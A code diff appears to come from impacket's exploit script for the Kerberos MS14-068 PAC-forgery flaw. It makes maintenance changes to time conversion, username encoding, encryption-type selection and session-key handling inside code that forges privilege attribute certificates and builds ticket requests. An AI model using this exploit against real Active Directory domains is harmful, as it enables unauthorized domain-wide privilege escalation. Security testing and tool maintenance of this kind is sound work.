@@ -34,8 +34,6 @@
 #   Alberto Solino (@agsolino)
 #
 
-from __future__ import division
-from __future__ import print_function
 import cmd
 import logging
 import os
@@ -46,6 +44,7 @@ from binascii import unhexlify
 from threading import Thread, Lock
 from six import PY3
 
+from impacket import wintime
 from impacket.dcerpc.v5 import epm
 from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
     DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, \
@@ -457,7 +456,7 @@ class MS14_068:
         # 1) KERB_VALIDATION_INFO
         aTime = timegm(strptime(str(authTime), '%Y%m%d%H%M%SZ'))
 
-        unixTime = smb.POSIXtoFT(aTime)
+        unixTime = wintime.posix_to_filetime(aTime)
 
         kerbdata = KERB_VALIDATION_INFO()
 
@@ -571,11 +570,11 @@ class MS14_068:
         # 2) PAC_CLIENT_INFO
         pacClientInfo = PAC_CLIENT_INFO()
         pacClientInfo['ClientId'] = unixTime
-        try:
-            name = self.__username.encode('utf-16le')
-        except UnicodeDecodeError:
+        username = self.__username
+        if isinstance(username, bytes):
             import sys
-            name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
+            username = username.decode(sys.getfilesystemencoding())
+        name = username.encode('utf-16le')
         pacClientInfo['NameLength'] = len(name)
         pacClientInfo['Name'] = name
         pacClientInfoBlob = pacClientInfo.getData()
@@ -719,7 +718,7 @@ class MS14_068:
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
-        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
+        seq_set_iter(reqBody, 'etype', getKerberosTGSRequestEnctypes())
         reqBody['enc-authorization-data'] = noValue
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
@@ -789,9 +788,10 @@ class MS14_068:
 
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
-        newSessionKey = Key(cipher.enctype, encTGSRepPart['key']['keyvalue'].asOctets())
-    
-        return r, cipher, sessionKey, newSessionKey
+        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
+        newCipher = _enctype_table[encTGSRepPart['key']['keytype']]
+
+        return r, newCipher, sessionKey, newSessionKey
 
     def getForestSid(self):
         logging.debug('Calling NRPC DsrGetDcNameEx()')
@@ -1055,11 +1055,12 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5 import transport
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
-    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
+    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, \
+        getKerberosTGSRequestEnctypes, KerberosError
     from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, \
         AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
         EncTGSRepPart, ETYPE_INFO2_ENTRY
-    from impacket.krb5.crypto import Key
+    from impacket.krb5.crypto import Key, _enctype_table
     from impacket.dcerpc.v5.ndr import NDRULONG
     from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
         SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
